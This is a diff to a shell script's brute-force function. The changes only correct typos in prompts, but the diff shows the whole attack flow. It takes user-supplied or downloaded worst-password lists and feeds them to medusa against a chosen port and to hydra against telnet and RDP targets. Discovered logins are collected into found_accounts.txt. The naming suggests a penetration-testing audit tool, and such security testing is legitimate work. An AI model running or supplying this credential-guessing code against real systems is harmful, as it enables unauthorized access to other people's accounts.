@@ -210,8 +210,8 @@ function BAT(){
             read -p "[?] For using your password list enter (1), Or enter (2) for using system password list: " pass_choice
             if [ $pass_choice == 1 ];
                 then
-                    read -p "[?] Please entar file path (full) for users account: " users_list
-                    read -p "[?] Please entar file path (full) for passwords: " passwords_list
+                    read -p "[?] Please enter file path (full) for users accounts: " users_list
+                    read -p "[?] Please enter file path (full) for passwords: " passwords_list
                     echo "[#] Starting the attack now, findings will be save to a file - found_accounts.txt"
                     medusa -h $target -U $users_list -P $passwords_list -M $attack_port > audit_BAT.txt 2>&1
                     cat audit_BAT.txt | grep -B 1 -A 1 -ie "found" -e "login:" > found_accounts.txt
@@ -220,7 +220,7 @@ function BAT(){
             elif [ $pass_choice == 2 ];
                 then
                     sudo git clone https://github.com/shawntns/top-100-worst-passwords.git &> /dev/null 2>&1
-                    read -p "[?] Please entar file path (full) for users account: " users_list
+                    read -p "[?] Please enter file path (full) for users accounts: " users_list
                     echo "[#] Starting the attack now, findings will be save to a file - found_accounts.txt"
                     medusa -h $target -U $users_list -P ./top-100-worst-passwords/dic.txt -M $attack_port > audit_BAT.txt 2>&1
                     cat audit_BAT.txt | grep -B 1 -A 1 -ie "found" -e "login:"  > found_accounts.txt
@@ -234,8 +234,8 @@ function BAT(){
             read -p "[?] For using your password list enter (1), Or enter (2) for using system password list: " pass_choice
             if [ $pass_choice == 1 ];
                 then
-                    read -p "[?] Please entar file path (full) for users account: " users_list
-                    read -p "[?] Please entar file path (full) for passwords: " passwords_list
+                    read -p "[?] Please enter file path (full) for users accounts: " users_list
+                    read -p "[?] Please enter file path (full) for passwords: " passwords_list
                     echo "[#] Starting the attack now, findings will be save to a file - found_accounts.txt"
                     medusa -h $target -U $users_list -P $passwords_list -M $attack_port > audit_BAT.txt 2>&1
                     cat audit_BAT.txt | grep -B 1 -A 1 -ie "found" -e "login:" > found_accounts.txt
@@ -244,7 +244,7 @@ function BAT(){
             elif [ $pass_choice == 2 ];
                 then
                     sudo git clone https://github.com/shawntns/top-100-worst-passwords.git &> /dev/null 2>&1
-                    read -p "[?] Please entar file path (full) for users account: " users_list
+                    read -p "[?] Please enter file path (full) for users accounts: " users_list
                     echo "[#] Starting the attack now, findings will be save to a file - found_accounts.txt"
                     medusa -h $target -U $users_list -P ./top-100-worst-passwords/dic.txt -M $attack_port > audit_BAT.txt 2>&1
                     cat audit_BAT.txt | grep -B 1 -A 1 -ie "found" -e "login:" > found_accounts.txt
@@ -259,8 +259,8 @@ function BAT(){
             read -p "[?] For using your password list enter (1), Or enter (2) for using system password list: " pass_choice
             if [ $pass_choice == 1 ];
                 then
-                    read -p "[?] Please entar file path (full) for users account: " users_list
-                    read -p "[?] Please entar file path (full) for passwords: " passwords_list
+                    read -p "[?] Please enter file path (full) for users accounts: " users_list
+                    read -p "[?] Please enter file path (full) for passwords: " passwords_list
                     echo "[#] Starting the attack now, findings will be save to a file - found_accounts.txt"
                     hydra -L $users_list -P $passwords_list telnet://$target > audit_BAT.txt 2>&1
                     cat audit_BAT.txt | grep -B 1 -A 1 -ie "found" -e "login:" > found_accounts.txt
@@ -269,7 +269,7 @@ function BAT(){
             elif [ $pass_choice == 2 ];
                 then
                     sudo git clone https://github.com/shawntns/top-100-worst-passwords.git &> /dev/null 2>&1
-                    read -p "[?] Please entar file path (full) for users account: " users_list
+                    read -p "[?] Please enter file path (full) for users accounts: " users_list
                     echo "[#] Starting the attack now, findings will be save to a file - found_accounts.txt"
                     hydra -L $users_list -P ./top-100-worst-passwords/dic.txt telnet://$target > audit_BAT.txt 2>&1
                     cat audit_BAT.txt | grep -B 1 -A 1 -ie "found" -e "login:" > found_accounts.txt
@@ -283,8 +283,8 @@ function BAT(){
             read -p "[?] For using your password list enter (1), Or enter (2) for using system password list: " pass_choice
             if [ $pass_choice == 1 ];
                 then
-                    read -p "[?] Please entar file path (full) for users account: " users_list
-                    read -p "[?] Please entar file path (full) for passwords: " passwords_list
+                    read -p "[?] Please enter file path (full) for users accounts: " users_list
+                    read -p "[?] Please enter file path (full) for passwords: " passwords_list
                     echo "[#] Starting the attack now, findings will be save to a file - found_accounts.txt"
                     hydra -L $users_list -P $passwords_list rdp://$target > audit_BAT.txt 2>&1
                     cat audit_BAT.txt | grep -B 1 -A 1 -ie "found" -e "login:" > found_accounts.txt
@@ -293,7 +293,7 @@ function BAT(){
             elif [ $pass_choice == 2 ];
                 then
                     sudo git clone https://github.com/shawntns/top-100-worst-passwords.git &> /dev/null 2>&1
-                    read -p "[?] Please entar file path (full) for users account: " users_list
+                    read -p "[?] Please enter file path (full) for users accounts: " users_list
                     echo "[#] Starting the attack now, findings will be save to a file - found_accounts.txt"
                     hydra -L $users_list -P ./top-100-worst-passwords/dic.txt rdp://$target > audit_BAT.txt 2>&1
                     cat audit_BAT.txt | grep -B 1 -A 1 -ie "found" -e "login:" > found_accounts.txt
